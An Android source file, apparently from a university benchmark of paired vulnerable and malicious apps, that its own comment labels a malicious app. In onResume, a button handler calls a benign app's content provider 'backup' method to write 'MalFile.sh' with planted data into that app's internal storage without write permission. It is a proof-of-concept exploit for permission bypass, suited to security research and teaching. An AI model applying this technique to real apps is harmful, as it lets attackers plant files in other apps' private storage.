package edu.ksu.cs.malicious;

import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;

/*
A malicious app that exploits a benign content provider to write files into internal storage
without requesting for write permissions.
 */
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(new String[]{"edu.ksu.cs.benign.filecontentprovider.rperm"}, 101);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        Button stealInfo = (Button) findViewById(R.id.scenario1);
        stealInfo.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Uri.Builder ub = new Uri.Builder();
                ub.authority("edu.ksu.cs.benign.filecontentprovider");
                ub.scheme("content");
                Bundle b = new Bundle();
                b.putCharSequence("notes", "malicious data");
                getContentResolver().call(ub.build(), "backup", "MalFile.sh", b);
            }
        });
    }
}
